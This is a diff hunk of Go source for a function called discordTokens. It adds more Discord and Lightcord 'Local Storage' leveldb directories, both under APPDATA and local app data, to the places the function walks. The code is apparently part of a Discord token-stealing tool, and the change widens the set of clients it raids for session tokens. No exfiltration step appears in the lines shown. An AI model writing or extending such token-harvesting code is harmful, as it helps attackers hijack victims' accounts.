@@ -626,10 +626,15 @@ func discordTokens(root string) []string {
 	}
 
 	roaming := os.Getenv("APPDATA")
+	local := appDataLocal()
 	for _, d := range []string{
 		filepath.Join(roaming, "discord", "Local Storage", "leveldb"),
 		filepath.Join(roaming, "discordcanary", "Local Storage", "leveldb"),
 		filepath.Join(roaming, "discordptb", "Local Storage", "leveldb"),
+		filepath.Join(roaming, "discorddevelopment", "Local Storage", "leveldb"),
+		filepath.Join(roaming, "Lightcord", "Local Storage", "leveldb"),
+		filepath.Join(local, "Discord", "Local Storage", "leveldb"),
+		filepath.Join(roaming, "discord", "Local Storage"),
 	} {
 		walk(d)
 	}
